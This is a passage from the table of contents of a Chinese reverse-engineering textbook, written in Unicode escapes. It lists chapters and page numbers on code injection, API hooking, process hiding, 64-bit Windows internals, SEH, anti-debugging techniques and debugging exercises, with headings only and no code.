28.4.1\u3000\u83b7\u53d6ThreadProc()\u51fd\u6570\u7684\u4e8c\u8fdb\u5236\u4ee3\u7801 266 28.4.2\u3000CodeInjection2.cpp 267 28.5\u3000\u8c03\u8bd5\u7ec3\u4e60 270 28.5.1\u3000\u8c03\u8bd5notepad.exe 270 28.5.2\u3000\u8bbe\u7f6eOllyDbg\u9009\u9879 270 28.5.3\u3000\u8fd0\u884cCodeInjection2.exe 271 28.5.4\u3000\u7ebf\u7a0b\u8d77\u59cb\u4ee3\u7801 272 28.6\u3000\u8be6\u7ec6\u5206\u6790 272 28.6.1\u3000\u751f\u6210\u6808\u5e27 272 28.6.2\u3000THREAD_PARAM\u7ed3\u6784\u4f53\u6307\u9488 273 28.6.3 \u201cUser32.dll\u201d\u5b57\u7b26\u4e32 274 28.6.4\u3000\u538b\u5165\u201cuser32.dll\u201d\u5b57\u7b26\u4e32\u53c2\u6570 274 28.6.5\u3000\u8c03\u7528LoadLibraryA(\u201cuser32.dll\u201d) 275 28.6.6 \u201cMessageBoxA\u201d\u5b57\u7b26\u4e32 276 28.6.7\u3000\u8c03\u7528GetProcAddress(hMod,\u201cMessageBoxA\u201d) 276 28.6.8\u3000\u538b\u5165MessageBoxA()\u51fd\u6570\u7684\u53c2\u6570 1 - MB_OK 277 28.6.9\u3000\u538b\u5165MessageBoxA()\u51fd\u6570\u7684\u53c2\u6570 2 -\u201cReverseCore\u201d 277 28.6.10\u3000\u538b\u5165MessageBoxA()\u51fd\u6570\u7684\u53c2\u6570 3 -\u201cwww.reversecore.com\u201d 278 28.6.11\u3000\u538b\u5165MessageBoxA()\u51fd\u6570\u7684\u53c2\u6570 4 -NULL 279 28.6.12\u3000\u8c03\u7528MessageBoxA() 279 28.6.13\u3000\u8bbe\u7f6eThreadProc()\u51fd\u6570\u7684\u8fd4\u56de\u503c 280 28.6.14\u3000\u5220\u9664\u6808\u5e27\u53ca\u51fd\u6570\u8fd4\u56de 280 28.7\u3000\u5c0f\u7ed3 280 \u7b2c\u56db\u90e8\u5206\u3000API\u94a9\u53d6 \u7b2c29\u7ae0\u3000API\u94a9\u53d6\uff1a\u9006\u5411\u5206\u6790\u4e4b\u201c\u82b1\u201d 282 29.1\u3000\u94a9\u53d6 282 29.2\u3000API\u662f\u4ec0\u4e48 282 29.3\u3000API\u94a9\u53d6 283 29.3.1\u3000\u6b63\u5e38\u8c03\u7528API 283 29.3.2\u3000\u94a9\u53d6API\u8c03\u7528 284 29.4\u3000\u6280\u672f\u56fe\u8868 284 29.4.1\u3000\u65b9\u6cd5\u5bf9\u8c61\uff08\u662f\u4ec0\u4e48\uff09 285 29.4.2\u3000\u4f4d\u7f6e\uff08\u4f55\u5904\uff09 285 29.4.3\u3000\u6280\u672f\uff08\u5982\u4f55\uff09 286 29.4.4\u3000API 286 \u7b2c30\u7ae0\u3000\u8bb0\u4e8b\u672cWriteFile() API\u94a9\u53d6 288 30.1\u3000\u6280\u672f\u56fe\u8868 - \u8c03\u8bd5\u6280\u672f 288 30.2\u3000\u5173\u4e8e\u8c03\u8bd5\u5668\u7684\u8bf4\u660e 289 30.2.1\u3000\u672f\u8bed 289 30.2.2\u3000\u8c03\u8bd5\u5668\u529f\u80fd 289 30.2.3\u3000\u8c03\u8bd5\u5668\u7684\u5de5\u4f5c\u539f\u7406 289 30.2.4\u3000\u8c03\u8bd5\u4e8b\u4ef6 289 30.3\u3000\u8c03\u8bd5\u6280\u672f\u6d41\u7a0b 290 30.4\u3000\u7ec3\u4e60 291 30.5\u3000\u5de5\u4f5c\u539f\u7406 293 30.5.1\u3000\u6808 293 30.5.2\u3000\u6267\u884c\u6d41 295 30.5.3 \u201c\u8131\u94a9\u201d&\u201c\u94a9\u5b50\u201d 295 30.6\u3000\u6e90\u4ee3\u7801\u5206\u6790 295 30.6.1\u3000main() 296 30.6.2\u3000DebugLoop() 296 30.6.3\u3000EXIT_PROCESS_DEBUG_EVENT 298 30.6.4\u3000CREATE_PROCESS_DEBUG_EVENT-OnCreateProcess-DebugEvent() 298 30.6.5\u3000EXCEPTION_DEBUG_EVENT-OnException-DebugEvent() 300 \u7b2c31\u7ae0\u3000\u5173\u4e8e\u8c03\u8bd5\u5668 305 31.1\u3000OllyDbg 305 31.2\u3000IDA Pro 305 31.3\u3000WinDbg 306 \u7b2c32\u7ae0\u3000\u8ba1\u7b97\u5668\u663e\u793a\u4e2d\u6587\u6570\u5b57 308 32.1\u3000\u6280\u672f\u56fe\u8868 308 32.2\u3000\u9009\u5b9a\u76ee\u6807API 309 32.3\u3000IAT\u94a9\u53d6\u5de5\u4f5c\u539f\u7406 312 32.4\u3000\u7ec3\u4e60\u793a\u4f8b 314 32.5\u3000\u6e90\u4ee3\u7801\u5206\u6790 316 32.5.1\u3000DllMain() 316 32.5.2\u3000MySetWindowTextW() 317 32.5.3\u3000hook_iat() 319 32.6\u3000\u8c03\u8bd5\u88ab\u6ce8\u5165\u7684DLL\u6587\u4ef6 322 32.6.1\u3000DllMain() 325 32.6.2\u3000hook_iat() 325 32.6.3\u3000MySetWindowTextW() 327 32.7\u3000\u5c0f\u7ed3 328 \u7b2c33\u7ae0\u3000\u9690\u85cf\u8fdb\u7a0b 329 33.1\u3000\u6280\u672f\u56fe\u8868 329 33.2\u3000API\u4ee3\u7801\u4fee\u6539\u6280\u672f\u7684\u539f\u7406 329 33.2.1\u3000\u94a9\u53d6\u4e4b\u524d 330 33.2.2\u3000\u94a9\u53d6\u4e4b\u540e 330 33.3\u3000\u8fdb\u7a0b\u9690\u85cf 332 33.3.1\u3000\u8fdb\u7a0b\u9690\u85cf\u5de5\u4f5c\u539f\u7406 332 33.3.2\u3000\u76f8\u5173API 332 33.3.3\u3000\u9690\u85cf\u6280\u672f\u7684\u95ee\u9898 333 33.4\u3000\u7ec3\u4e60 #1\uff08HideProc.exe\uff0cstealth.dll\uff09 333 33.4.1\u3000\u8fd0\u884cnotepad.exe\u3001procexp.exe\u3001taskmgr.exe 334 33.4.2\u3000\u8fd0\u884cHideProc.exe 334 33.4.3\u3000\u786e\u8ba4stealth.dll\u6ce8\u5165\u6210\u529f 334 33.4.4\u3000\u67e5\u770bnotepad.exe\u8fdb\u7a0b\u662f\u5426\u9690\u85cf\u6210\u529f 335 33.4.5\u3000\u53d6\u6d88notepad.exe\u8fdb\u7a0b\u9690\u85cf 336 33.5\u3000\u6e90\u4ee3\u7801\u5206\u6790 336 33.5.1\u3000HideProc.cpp 336 33.5.2\u3000stealth.cpp 338 33.6\u3000\u5168\u5c40API\u94a9\u53d6 344 33.6.1\u3000Kernel32.CreateProcess() API 344 33.6.2\u3000Ntdll.ZwResumeThread() API 345 33.7\u3000\u7ec3\u4e60#2\uff08HideProc2.exe,Stealth2.dll\uff09 345 33.7.1\u3000\u590d\u5236stealth2.dll\u6587\u4ef6\u5230%SYSTEM%\u6587\u4ef6\u5939\u4e2d 345 33.7.2\u3000\u8fd0\u884cHideProc2.exe -hide 346 33.7.3\u3000\u8fd0\u884cProcExp.exe&notepad.exe 346 33.7.4\u3000\u8fd0\u884cHideProc2.exe -show 347 33.8\u3000\u6e90\u4ee3\u7801\u5206\u6790 348 33.8.1\u3000HideProc2.cpp 348 33.8.2\u3000stealth2.cpp 348 33.9\u3000\u5229\u7528\u201c\u70ed\u8865\u4e01\u201d\u6280\u672f\u94a9\u53d6API 350 33.9.1\u3000API\u4ee3\u7801\u4fee\u6539\u6280\u672f\u7684\u95ee\u9898 350 33.9.2 \u201c\u70ed\u8865\u4e01\u201d\uff08\u4fee\u65397\u4e2a\u5b57\u8282\u4ee3\u7801\uff09 350 33.10\u3000\u7ec3\u4e60 #3\uff1astealth3.dll 353 33.11\u3000\u6e90\u4ee3\u7801\u5206\u6790 353 33.12\u3000\u4f7f\u7528\u201c\u70ed\u8865\u4e01\u201dAPI\u94a9\u53d6\u6280\u672f\u65f6\u9700\u8981\u8003\u8651\u7684\u95ee\u9898 356 33.13\u3000\u5c0f\u7ed3 357 \u7b2c34\u7ae0\u3000\u9ad8\u7ea7\u5168\u5c40API\u94a9\u53d6\uff1aIE\u8fde\u63a5\u63a7\u5236 359 34.1\u3000\u76ee\u6807API 359 34.2\u3000IE\u8fdb\u7a0b\u7ed3\u6784 361 34.3\u3000\u5173\u4e8e\u5168\u5c40API\u94a9\u53d6\u7684\u6982\u5ff5 362 34.3.1\u3000\u5e38\u89c4API\u94a9\u53d6 363 34.3.2\u3000\u5168\u5c40API\u94a9\u53d6 363 34.4\u3000ntdll!ZwResumeThread() API 364 34.5\u3000\u7ec3\u4e60\u793a\u4f8b\uff1a\u63a7\u5236IE\u7f51\u7edc\u8fde\u63a5 368 34.5.1\u3000\u8fd0\u884cIE 368 34.5.2\u3000\u6ce8\u5165DLL 369 34.5.3\u3000\u521b\u5efa\u65b0\u9009\u9879\u5361 369 34.5.4\u3000\u5c1d\u8bd5\u8fde\u63a5\u7f51\u7ad9 370 34.5.5\u3000\u5378\u8f7dDLL 371 34.5.6\u3000\u8bfe\u5916\u7ec3\u4e60 372 34.6\u3000\u793a\u4f8b\u6e90\u4ee3\u7801 372 34.6.1\u3000DllMain() 372 34.6.2\u3000NewInternetConnectW() 373 34.6.3\u3000NewZwResumeThread() 374 34.7\u3000\u5c0f\u7ed3 375 \u7b2c35\u7ae0\u3000\u4f18\u79c0\u5206\u6790\u5de5\u5177\u7684\u4e94\u79cd\u6807\u51c6 376 35.1\u3000\u5de5\u5177 376 35.2\u3000\u4ee3\u7801\u9006\u5411\u5206\u6790\u5de5\u7a0b\u5e08 376 35.3\u3000\u4f18\u79c0\u5206\u6790\u5de5\u5177\u7684\u4e94\u79cd\u6807\u51c6 376 35.3.1\u3000\u7cbe\u7b80\u5de5\u5177\u6570\u91cf 377 35.3.2\u3000\u5de5\u5177\u529f\u80fd\u7b80\u5355\u3001\u4f7f\u7528\u65b9\u4fbf 377 35.3.3\u3000\u5b8c\u5168\u638c\u63e1\u5404\u79cd\u529f\u80fd 377 35.3.4\u3000\u4e0d\u65ad\u5347\u7ea7\u66f4\u65b0 377 35.3.5\u3000\u7406\u89e3\u5de5\u5177\u7684\u6838\u5fc3\u5de5\u4f5c\u539f\u7406 377 35.4\u3000\u719f\u7ec3\u7a0b\u5ea6\u7684\u91cd\u8981\u6027 377 \u7b2c\u4e94\u90e8\u5206\u300064\u4f4d&Windows\u5185\u68386 \u7b2c36\u7ae0\u300064\u4f4d\u8ba1\u7b97 380 36.1\u300064\u4f4d\u8ba1\u7b97\u73af\u5883 380 36.1.1\u300064\u4f4dCPU 380 36.1.2\u300064\u4f4dOS 381 36.1.3\u3000Win32 API 381 36.1.4\u3000WOW64 381 36.1.5\u3000\u7ec3\u4e60\uff1aWOW64Test 384 36.2\u3000\u7f16\u8bd164\u4f4d\u6587\u4ef6 385 36.2.1\u3000Microsoft Windows SDK \uff08Software Development Kit\uff09 386 36.2.2\u3000\u8bbe\u7f6eVisual C++ 2010 Express\u73af\u5883 386 \u7b2c37\u7ae0\u3000x64\u5904\u7406\u5668 389 37.1\u3000x64\u4e2d\u65b0\u589e\u6216\u53d8\u66f4\u7684\u9879\u76ee 389 37.1.1\u300064\u4f4d 389 37.1.2\u3000\u5185\u5b58 389 37.1.3\u3000\u901a\u7528\u5bc4\u5b58\u5668 389 37.1.4\u3000CALL/JMP\u6307\u4ee4 390 37.1.5\u3000\u51fd\u6570\u8c03\u7528\u7ea6\u5b9a 391 37.1.6\u3000\u6808 & \u6808\u5e27 392 37.2\u3000\u7ec3\u4e60\uff1aStack32.exe & Stack64.exe 392 37.2.1\u3000Stack32.exe 392 37.2.2\u3000Stack64.exe 394 37.3\u3000\u5c0f\u7ed3 397 \u7b2c38\u7ae0\u3000PE32+ 398 38.1\u3000PE32+\uff08PE+\u3001PE64\uff09 398 38.1.1\u3000IMAGE_NT_HEADERS 398 38.1.2\u3000IMAGE_FILE_HEADER 398 38.1.3\u3000IMAGE_OPTIONAL_HEADER 399 38.1.4\u3000IMAGE_THUNK_DATA 401 38.1.5\u3000IMAGE_TLS_DIRECTORY 403 \u7b2c39\u7ae0\u3000WinDbg 405 39.1\u3000WinDbg 405 39.1.1\u3000WinDbg\u7684\u7279\u5f81 405 39.1.2\u3000\u8fd0\u884cWinDbg 406 39.1.3\u3000\u5185\u6838\u8c03\u8bd5 407 39.1.4\u3000WinDbg\u57fa\u672c\u6307\u4ee4 409 \u7b2c40\u7ae0\u300064\u4f4d\u8c03\u8bd5 411 40.1\u3000x64\u73af\u5883\u4e0b\u7684\u8c03\u8bd5\u5668 411 40.2\u300064\u4f4d\u8c03\u8bd5 411 40.3\u3000PE32\uff1aWOW64Test_x86.exe 413 40.3.1\u3000EP\u4ee3\u7801 414 40.3.2\u3000Startup\u4ee3\u7801 414 40.3.3\u3000main()\u51fd\u6570 415 40.4\u3000PE32+\uff1aWOW64Test_x64.exe 416 40.4.1\u3000\u7cfb\u7edf\u65ad\u70b9 416 40.4.2\u3000EP\u4ee3\u7801 417 40.4.3\u3000Startup\u4ee3\u7801 418 40.4.4\u3000main()\u51fd\u6570 420 40.5\u3000\u5c0f\u7ed3 423 \u7b2c41\u7ae0\u3000ASLR 424 41.1\u3000Windows\u5185\u6838\u7248\u672c 424 41.2\u3000ASLR 424 41.3\u3000Visual C++ 424 41.4\u3000ASLR.exe 425 41.4.1\u3000\u8282\u533a\u4fe1\u606f 426 41.4.2\u3000IMAGE_FILE_HEADER\\Characteristics 427 41.4.3\u3000IMAGE_OPTIONAL_HEADER\\DLL Characteristics 428 41.5\u3000\u7ec3\u4e60\uff1a\u5220\u9664ASLR\u529f\u80fd 428 \u7b2c42\u7ae0\u3000\u5185\u68386\u4e2d\u7684\u4f1a\u8bdd 430 42.1\u3000\u4f1a\u8bdd 430 42.2\u3000\u4f1a\u8bdd0\u9694\u79bb\u673a\u5236 432 42.3\u3000\u589e\u5f3a\u5b89\u5168\u6027 432 \u7b2c43\u7ae0\u3000\u5185\u68386\u4e2d\u7684DLL\u6ce8\u5165 433 43.1\u3000\u518d\u73b0DLL\u6ce8\u5165\u5931\u8d25 433 43.1.1\u3000\u6e90\u4ee3\u7801 433 43.1.2\u3000\u6ce8\u5165\u6d4b\u8bd5 435 43.2\u3000\u539f\u56e0\u5206\u6790 436 43.2.1\u3000\u8c03\u8bd5 #1 436 43.2.2\u3000\u8c03\u8bd5 #2 438 43.3\u3000\u7ec3\u4e60\uff1a\u4f7fCreateRemoteThread()\u6b63\u5e38\u5de5\u4f5c 440 43.3.1\u3000\u65b9\u6cd5 #1\uff1a\u4fee\u6539CreateSuspended\u53c2\u6570\u503c 440 43.3.2\u3000\u65b9\u6cd5 #2\uff1a\u64cd\u7eb5\u6761\u4ef6\u5206\u652f 441 43.4\u3000\u7a0d\u4f5c\u6574\u7406 443 43.5\u3000InjectDll_new.exe 443 43.5.1\u3000InjectDll_new.cpp 443 43.5.2\u3000\u6ce8\u5165\u7ec3\u4e60 446 \u7b2c44\u7ae0\u3000InjDll.exe\uff1aDLL\u6ce8\u5165\u4e13\u7528\u5de5\u5177 448 44.1\u3000InjDll.exe 448 44.1.1\u3000\u4f7f\u7528\u65b9\u6cd5 448 44.1.2\u3000\u4f7f\u7528\u793a\u4f8b 449 44.1.3\u3000\u6ce8\u610f\u4e8b\u9879 450 \u7b2c\u516d\u90e8\u5206\u3000\u9ad8\u7ea7\u9006\u5411\u5206\u6790\u6280\u672f \u7b2c45\u7ae0\u3000TLS\u56de\u8c03\u51fd\u6570 452 45.1\u3000\u7ec3\u4e60 #1\uff1aHelloTls.exe 452 45.2\u3000TLS 453 45.2.1\u3000IMAGE_DATA_DIRECTORY[9] 453 45.2.2\u3000IMAGE_TLS_DIRECTORY 454 45.2.3\u3000\u56de\u8c03\u51fd\u6570\u5730\u5740\u6570\u7ec4 454 45.3\u3000TLS\u56de\u8c03\u51fd\u6570 455 45.4\u3000\u7ec3\u4e60 #2\uff1aTlsTest.exe 456 45.4.1\u3000DLL_PROCESS_ATTACH 457 45.4.2\u3000DLL_THREAD_ATTACH 457 45.4.3\u3000DLL_THREAD_DETACH 457 45.4.4\u3000DLL_PROCESS_DETACH 457 45.5\u3000\u8c03\u8bd5TLS\u56de\u8c03\u51fd\u6570 458 45.6\u3000\u624b\u5de5\u6dfb\u52a0TLS\u56de\u8c03\u51fd\u6570 459 45.6.1\u3000\u4fee\u6539\u524d\u7684\u539f\u7a0b\u5e8f 460 45.6.2\u3000\u8bbe\u8ba1\u89c4\u5212 460 45.6.3\u3000\u7f16\u8f91PE\u6587\u4ef6\u5934 461 45.6.4\u3000\u8bbe\u7f6eIMAGE_TLS_DIRECTORY\u7ed3\u6784\u4f53 463 45.6.5\u3000\u7f16\u5199TLS\u56de\u8c03\u51fd\u6570 464 45.6.6\u3000\u6700\u7ec8\u5b8c\u6210 464 45.7\u3000\u5c0f\u7ed3 465 \u7b2c46\u7ae0\u3000TEB 466 46.1\u3000TEB 466 46.1.1\u3000TEB\u7ed3\u6784\u4f53\u7684\u5b9a\u4e49 466 46.1.2\u3000TEB\u7ed3\u6784\u4f53\u6210\u5458 466 46.1.3\u3000\u91cd\u8981\u6210\u5458 469 46.2\u3000TEB\u8bbf\u95ee\u65b9\u6cd5 470 46.2.1\u3000Ntdll.NtCurrentTeb() 470 46.2.2\u3000FS\u6bb5\u5bc4\u5b58\u5668 471 46.3\u3000\u5c0f\u7ed3 472 \u7b2c47\u7ae0\u3000PEB 473 47.1\u3000PEB 473 47.1.1\u3000PEB\u8bbf\u95ee\u65b9\u6cd5 473 47.1.2\u3000PEB\u7ed3\u6784\u4f53\u7684\u5b9a\u4e49 474 47.1.3\u3000PEB\u7ed3\u6784\u4f53\u7684\u6210\u5458 475 47.2\u3000PEB\u7684\u91cd\u8981\u6210\u5458 477 47.2.1\u3000PEB.BeingDebugged 478 47.2.2\u3000PEB.ImageBaseAddress 478 47.2.3\u3000PEB.Ldr 479 47.2.4\u3000PEB.ProcessHeap & PEB.NtGlobalFlag 480 47.3\u3000\u5c0f\u7ed3 480 \u7b2c48\u7ae0\u3000SEH 481 48.1\u3000SEH 481 48.2\u3000SEH\u7ec3\u4e60\u793a\u4f8b #1 481 48.2.1\u3000\u6b63\u5e38\u8fd0\u884c 481 48.2.2\u3000\u8c03\u8bd5\u8fd0\u884c 482 48.3\u3000OS\u7684\u5f02\u5e38\u5904\u7406\u65b9\u6cd5 484 48.3.1\u3000\u6b63\u5e38\u8fd0\u884c\u65f6\u7684\u5f02\u5e38\u5904\u7406\u65b9\u6cd5 484 48.3.2\u3000\u8c03\u8bd5\u8fd0\u884c\u65f6\u7684\u5f02\u5e38\u5904\u7406\u65b9\u6cd5 484 48.4\u3000\u5f02\u5e38 485 48.4.1\u3000EXCEPTION_ACCESS_VIOLATION(C0000005) 486 48.4.2\u3000EXCEPTION_BREAKPOINT(80000003) 486 48.4.3\u3000EXCEPTION_ILLEGAL_INSTRUCTION(C000001D) 488 48.4.4\u3000EXCEPTION_INT_DIVIDE_BY_ZERO(C0000094) 488 48.4.5\u3000EXCEPTION_SINGLE_STEP(80000004) 489 48.5\u3000SEH\u8be6\u7ec6\u8bf4\u660e 489 48.5.1\u3000SEH\u94fe 489 48.5.2\u3000\u5f02\u5e38\u5904\u7406\u51fd\u6570\u7684\u5b9a\u4e49 489 48.5.3\u3000TEB.NtTib.ExceptionList 491 48.5.4\u3000SEH\u5b89\u88c5\u65b9\u6cd5 492 48.6\u3000SEH\u7ec3\u4e60\u793a\u4f8b #2\uff08seh.exe\uff09 492 48.6.1\u3000\u67e5\u770bSEH\u94fe 493 48.6.2\u3000\u6dfb\u52a0SEH 493 48.6.3\u3000\u53d1\u751f\u5f02\u5e38 494 48.6.4\u3000\u67e5\u770b\u5f02\u5e38\u5904\u7406\u5668\u53c2\u6570 494 48.6.5\u3000\u8c03\u8bd5\u5f02\u5e38\u5904\u7406\u5668 496 48.6.6\u3000\u5220\u9664SEH 498 48.7\u3000\u8bbe\u7f6eOllyDbg\u9009\u9879 499 48.7.1\u3000\u5ffd\u7565KERNEL32\u4e2d\u53d1\u751f\u7684\u5185\u5b58\u975e\u6cd5\u8bbf\u95ee\u5f02\u5e38 500 48.7.2\u3000\u5411\u88ab\u8c03\u8bd5\u8005\u6d3e\u9001\u5f02\u5e38 500 48.7.3\u3000\u5176\u4ed6\u5f02\u5e38\u5904\u7406 500 48.7.4\u3000\u7b80\u5355\u7ec3\u4e60 500 48.8\u3000\u5c0f\u7ed3 501 \u7b2c49\u7ae0\u3000IA-32\u6307\u4ee4 502 49.1\u3000IA-32\u6307\u4ee4 502 49.2\u3000\u5e38\u7528\u672f\u8bed 502 49.2.1\u3000\u53cd\u6c47\u7f16\u5668 503 49.2.2\u3000\u53cd\u7f16\u8bd1\u5668 504 49.2.3\u3000\u53cd\u7f16\u8bd1\u7b80\u4ecb 504 49.3\u3000IA-32\u6307\u4ee4\u683c\u5f0f 506 49.3.1\u3000\u6307\u4ee4\u524d\u7f00 507 49.3.2\u3000\u64cd\u4f5c\u7801 507 49.3.3\u3000ModR/M 507 49.3.4\u3000SIB 508 49.3.5\u3000\u4f4d\u79fb 508 49.3.6\u3000\u7acb\u5373\u6570 509 49.4\u3000\u6307\u4ee4\u89e3\u6790\u624b\u518c 509 49.4.1\u3000\u4e0b\u8f7dIA-32\u7528\u6237\u624b\u518c 509 49.4.2\u3000\u6253\u5370\u6307\u4ee4\u89e3\u6790\u624b\u518c 509 49.5\u3000\u6307\u4ee4\u89e3\u6790\u7ec3\u4e60 510 49.5.1\u3000\u64cd\u4f5c\u7801\u6620\u5c04 510 49.5.2\u3000\u64cd\u4f5c\u6570 511 49.5.3\u3000ModR/M 512 49.5.4\u3000Group 514 49.5.5\u3000\u524d\u7f00 516 49.5.6\u3000\u53cc\u5b57\u8282\u64cd\u4f5c\u7801 518 49.5.7\u3000\u79fb\u4f4d\u503c&\u7acb\u5373\u6570 519 49.5.8\u3000SIB 520 49.6\u3000\u6307\u4ee4\u89e3\u6790\u8bfe\u5916\u7ec3\u4e60 524 49.7\u3000\u5c0f\u7ed3 524 \u7b2c\u4e03\u90e8\u5206\u3000\u53cd\u8c03\u8bd5\u6280\u672f \u7b2c50\u7ae0\u3000\u53cd\u8c03\u8bd5\u6280\u672f 526 50.1\u3000\u53cd\u8c03\u8bd5\u6280\u672f 526 50.1.1\u3000\u4f9d\u8d56\u6027 526 50.1.2\u3000\u591a\u79cd\u53cd\u8c03\u8bd5\u6280\u672f 526 50.2\u3000\u53cd\u8c03\u8bd5\u7834\u89e3\u6280\u672f 526 50.3\u3000\u53cd\u8c03\u8bd5\u6280\u672f\u7684\u5206\u7c7b 527 50.3.1\u3000\u9759\u6001\u53cd\u8c03\u8bd5\u6280\u672f 528 50.3.2\u3000\u52a8\u6001\u53cd\u8c03\u8bd5\u6280\u672f 528 \u7b2c51\u7ae0\u3000\u9759\u6001\u53cd\u8c03\u8bd5\u6280\u672f 529 51.1\u3000\u9759\u6001\u53cd\u8c03\u8bd5\u7684\u76ee\u7684 529 51.2\u3000PEB 529 51.2.1\u3000BeingDebugged(+0x2) 531 51.2.2\u3000Ldr(+0xC) 531 51.2.3\u3000Process Heap(+0x18) 532 51.2.4\u3000NtGlobalFlag(+0x68) 533 51.2.5\u3000\u7ec3\u4e60\uff1a?StaAD_PEB.exe 534 51.2.6\u3000\u7834\u89e3\u4e4b\u6cd5 534 51.3\u3000NtQueryInformationProcess() 537 51.3.1\u3000ProcessDebugPort(0x7) 538 51.3.2\u3000ProcessDebugObjectHandle(0x1E) 539 51.3.3\u3000ProcessDebugFlags(0x1F) 539 51.3.4\u3000\u7ec3\u4e60\uff1aStaAD_NtQIP.exe 540 51.3.5\u3000\u7834\u89e3\u4e4b\u6cd5 540 51.4\u3000NtQuerySystemInformation() 542 51.4.1\u3000SystemKernelDebugger-Information(0x23) 544 51.4.2\u3000\u7ec3\u4e60\uff1aStaAD_NtQSI.exe 545 51.4.3\u3000\u7834\u89e3\u4e4b\u6cd5 545 51.5\u3000NtQueryObject() 545 51.6\u3000ZwSetInformationThread() 549 51.6.1\u3000\u7ec3\u4e60\uff1aStaAD_ZwSIT.exe 549 51.6.2\u3000\u7834\u89e3\u4e4b\u6cd5 550 51.7\u3000TLS\u56de\u8c03\u51fd\u6570 550 51.8\u3000ETC 551 51.8.1\u3000\u7ec3\u4e60\uff1aStaAD_FindWindow.exe 551 51.8.2\u3000\u7834\u89e3\u4e4b\u6cd5 551 51.9\u3000\u5c0f\u7ed3 553 \u7b2c52\u7ae0\u3000\u52a8\u6001\u53cd\u8c03\u8bd5\u6280\u672f 554 52.1\u3000\u52a8\u6001\u53cd\u8c03\u8bd5\u6280\u672f\u7684\u76ee\u7684 554 52.2\u3000\u5f02\u5e38 554 52.2.1\u3000SEH 554 52.2.2\u3000SetUnhandledException-Filter() 558 52.3\u3000Timing Check 562 52.3.1\u3000\u65f6\u95f4\u95f4\u9694\u6d4b\u91cf\u6cd5 562 52.3.2\u3000RDTSC 563 52.4\u3000\u9677\u9631\u6807\u5fd7 565 52.4.1\u3000\u5355\u6b65\u6267\u884c 566 52.4.2\u3000INT 2D 569 52.5\u30000xCC\u63a2\u6d4b 572 52.5.1\u3000API\u65ad\u70b9 573 52.5.2\u3000\u6bd4\u8f83\u6821\u9a8c\u548c 575 \u7b2c53\u7ae0\u3000\u9ad8\u7ea7\u53cd\u8c03\u8bd5\u6280\u672f 577 53.1\u3000\u9ad8\u7ea7\u53cd\u8c03\u8bd5\u6280\u672f 577 53.2\u3000\u5783\u573e\u4ee3\u7801 577 53.3\u3000\u6270\u4e71\u4ee3\u7801\u5bf9\u9f50 578 53.4\u3000\u52a0\u5bc6/\u89e3\u5bc6 581 53.4.1\u3000\u7b80\u5355\u7684\u89e3\u7801\u793a\u4f8b 581 53.4.2\u3000\u590d\u6742\u7684\u89e3\u7801\u793a\u4f8b 582 53.4.3\u3000\u7279\u6b8a\u60c5\u51b5\uff1a\u4ee3\u7801\u91cd\u7ec4 584 53.5\u3000Stolen Bytes\uff08Remove OEP\uff09 584 53.6\u3000API\u91cd\u5b9a\u5411 587 53.6.1\u3000\u539f\u4ee3\u7801 588 53.6.2\u3000API\u91cd\u5b9a\u5411\u793a\u4f8b #1 588 53.6.3\u3000API\u91cd\u5b9a\u5411\u793a\u4f8b#2 589 53.7\u3000Debug Blocker\uff08Self Debugging\uff09 593 53.8\u3000\u5c0f\u7ed3 595 \u7b2c\u516b\u90e8\u5206\u3000\u8c03\u8bd5\u7ec3\u4e60 \u7b2c54\u7ae0\u3000\u8c03\u8bd5\u7ec3\u4e601\uff1a\u670d\u52a1 598 54.1\u3000\u670d\u52a1\u8fdb\u7a0b\u7684\u5de5\u4f5c\u539f\u7406 598 54.1.1\u3000\u670d\u52a1\u63a7\u5236\u5668 598 54.1.2\u3000\u670d\u52a1\u542f\u52a8\u8fc7\u7a0b 599 54.2\u3000DebugMe1.exe\u793a\u4f8b\u8bb2\u89e3 600 54.2.1\u3000\u5b89\u88c5\u670d\u52a1 600 54.2.2\u3000\u542f\u52a8\u670d\u52a1 602 54.2.3\u3000\u6e90\u4ee3\u7801 604 54.3\u3000\u670d\u52a1\u8fdb\u7a0b\u7684\u8c03\u8bd5 606 54.3.1\u3000\u95ee\u9898\u5728\u4e8eSCM 606 54.3.2\u3000\u8c03\u8bd5\u5668\u65e0\u6240\u4e0d\u80fd 606 54.3.3\u3000\u5e38\u7528\u65b9\u6cd5 606 54.4\u3000\u670d\u52a1\u8c03\u8bd5\u7ec3\u4e60 606 54.4.1\u3000\u76f4\u63a5\u8c03\u8bd5\uff1a\u5f3a\u5236\u8bbe\u7f6eEIP 606 54.4.2\u3000\u670d\u52a1\u8c03\u8bd5\u7684\u5e38\u7528\u65b9\u6cd5\uff1a\u201c\u9644\u52a0\u201d\u65b9\u5f0f 609 54.5\u3000\u5c0f\u7ed3 615 \u7b2c55\u7ae0\u3000\u8c03\u8bd5\u7ec3\u4e602\uff1a\u81ea\u6211\u521b\u5efa 616 55.1\u3000\u81ea\u6211\u521b\u5efa 616 55.2\u3000\u5de5\u4f5c\u539f\u7406 617 55.2.1\u3000\u521b\u5efa\u5b50\u8fdb\u7a0b\uff08\u6302\u8d77\u6a21\u5f0f\uff09 617 55.2.2\u3000\u66f4\u6539EIP 618 55.2.3\u3000\u6062\u590d\u4e3b\u7ebf\u7a0b 618 55.3\u3000\u793a\u4f8b\u7a0b\u5e8f\u6e90\u4ee3\u7801 618 55.4\u3000\u8c03\u8bd5\u7ec3\u4e60 620 55.4.1\u3000\u9700\u8981\u8003\u8651\u7684\u4e8b\u9879 620 55.4.2\u3000JIT\u8c03\u8bd5 621 55.4.3\u3000DebugMe2.exe 622 55.5\u3000\u5c0f\u7ed3 626 \u7b2c56\u7ae0\u3000\u8c03\u8bd5\u7ec3\u4e603\uff1aPE\u6620\u50cf\u5207\u6362 627 56.1\u3000PE\u6620\u50cf 627 56.2\u3000PE\u6620\u50cf\u5207\u6362 628 56.3\u3000\u793a\u4f8b\u7a0b\u5e8f\uff1aFake.exe\u3001Real.exe\u3001DebugMe3.exe 628 56.4\u3000\u8c03\u8bd51 631 56.4.1\u3000Open ? \u8f93\u5165\u8fd0\u884c\u53c2\u6570 631 56.4.2\u3000main()\u51fd\u6570 632 56.4.3\u3000SubFunc_1() 634 56.4.4\u3000CreateProcess(\u201cfake.exe\u201d\uff0cCREATE_SUSPENDED) 635 56.4.5\u3000SubFunc_2() 635 56.4.6\u3000SubFunc_3() 641 56.4.7\u3000ResumeThread() 644 56.5\u3000\u8c03\u8bd52 644 56.5.1\u3000\u601d\u8003 645 56.5.2\u3000\u5411EP\u8bbe\u7f6e\u65e0\u9650\u5faa\u73af 645 